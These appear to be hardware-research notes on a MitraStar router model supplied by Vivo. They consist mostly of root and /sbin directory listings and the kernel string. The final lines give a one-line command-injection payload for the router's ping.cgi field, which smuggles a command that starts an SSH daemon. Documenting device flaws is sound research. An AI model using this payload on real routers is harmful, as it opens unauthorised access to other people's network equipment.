# Mitrastart_vivo_GPT-2741GNAC-N1-SV

- Kernel: `Linux MitraStar 2.6.36 #1 SMP Mon Apr 18 23:24:52 CST 2022 mips GNU/Linux`

- ls /:

```
drwxrwxr-x   17 support  root           295 Apr 18 15:43 .
drwxrwxr-x   17 support  root           295 Apr 18 15:43 ..
drwxr-xr-x    1 support  root          2048 Aug  1  2016 app
drwxrwxr-x    2 support  root          1027 Apr 18 15:43 bin
drwxr-xr-x    1 support  root          2048 Aug  1  2016 bosa
drwxr-xr-x    1 support  root          2048 Aug  1  2016 bosabackup
drwxr-xr-x    1 support  root          2048 Aug  1  2016 data
drwxrwxr-x    5 support  root          1212 Apr 18 15:43 dev
lrwxrwxrwx    1 support  root             8 Apr 18 15:43 etc -> /tmp/etc
drwxrwxr-x    2 support  root             3 Apr 18 15:43 fwbuffer
drwxrwxr-x    7 support  root          5687 Apr 18 15:43 lib
lrwxrwxrwx    1 support  root            11 Apr 18 15:43 linuxrc -> bin/busybox
drwxrwxrwx    5 support  root           246 Apr 18 15:43 mini_httpdroot
dr-xr-xr-x  111 support  root             0 Jan  1  1970 proc
drwxrwxr-x    2 support  root           442 Apr 18 15:43 sbin
drwxrwxr-x    2 support  root             3 Apr 18 15:43 sys
drwxr-xr-x    8 support  root             0 Oct 10 14:57 tmp
drwxrwxr-x    4 support  root           172 Apr 18 15:43 userfs
drwxrwxr-x    8 support  root           112 Apr 18 15:43 usr
lrwxrwxrwx    1 support  root             8 Apr 18 15:43 var -> /tmp/var
--IPv4 Test Fin--
This area is read only.
```

- /sbin/

```
drwxrwxr-x    2 support  root           442 Apr 18 15:43 .
drwxrwxr-x   17 support  root           295 Apr 18 15:43 ..
-rwxr-xr-x    1 support  root         90944 Apr 18 15:43 address
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 arp -> ../bin/busybox
-rwxrwxr-x    1 support  root         13600 Apr 18 15:43 call_qcsapi_sockrpc
-rwxr-xr-x    1 support  root        104256 Apr 18 15:43 cert
-rwxr-xr-x    1 support  root        110892 Apr 18 15:43 devinf
-rwxr-xr-x    1 support  root        111716 Apr 18 15:43 devinf_mstc
-rwxr-xr-x    1 support  root         98400 Apr 18 15:43 getstations
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 getty -> ../bin/busybox
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 ifconfig -> ../bin/busybox
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 init -> ../bin/busybox
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 insmod -> ../bin/busybox
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 klogd -> ../bin/busybox
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 lsmod -> ../bin/busybox
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 mdev -> ../bin/busybox
-rwxr-xr-x    1 support  root        146928 Apr 18 15:43 netinf
-rwxr-xr-x    1 support  root        175164 Apr 18 15:43 netper
-rwxr-xr-x    1 support  root        132228 Apr 18 15:43 prog
-rwxr-xr-x    1 support  root         94808 Apr 18 15:43 read
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 reboot -> ../bin/busybox
-rwxr-xr-x    1 support  root        108616 Apr 18 15:43 reset
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 rmmod -> ../bin/busybox
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 route -> ../bin/busybox
-rwxr-xr-x    1 support  root        119168 Apr 18 15:43 stats
-rwxr-xr-x    1 support  root        123264 Apr 18 15:43 stats_mstc
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 sysctl -> ../bin/busybox
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 syslogd -> ../bin/busybox
lrwxrwxrwx    1 support  root            14 Apr 18 15:43 udhcpc -> ../bin/busybox
-rwxr-xr-x    1 support  root        199096 Apr 18 15:43 um
-rwxr-xr-x    1 support  root         92056 Apr 18 15:43 version
-rwxr-xr-x    1 support  root         99320 Apr 18 15:43 write
--IPv6 Test Fin--
This area is read only.
```

- Default route panel: `http://192.168.15.1/padrao`.
- enable sshd: `http://192.168.15.1/cgi-bin/ping.cgi` ping: `$(sshd; echo '192.168.15.1')`.
- Root user: ? avaible, so not acessible!
